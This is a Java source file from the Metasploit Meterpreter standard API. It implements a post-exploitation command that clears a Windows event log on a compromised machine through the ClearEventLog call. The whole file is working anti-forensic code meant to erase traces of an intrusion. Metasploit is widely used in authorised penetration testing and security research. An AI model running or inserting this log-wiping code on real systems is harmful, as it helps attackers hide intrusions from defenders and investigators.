package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;
import com.sun.jna.Pointer;

public class stdapi_sys_eventlog_clear extends stdapi_sys_eventlog implements Command {
    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        try
        {
            Pointer handle = Pointer.createConstant(request.getLongValue(TLVType.TLV_TYPE_EVENT_HANDLE));
            Boolean success = Libraries.AdvAPILibrary.ClearEventLog(handle, null);
            if (!success)
            {
                Integer error = Libraries.Kernel32Library.GetLastError();
                return error;
            }
            Libraries.AdvAPILibrary.CloseEventLog(handle);
            return ERROR_SUCCESS;
        }
        catch (Throwable e)
        {
            return ERROR_FAILURE;
        }
    }
}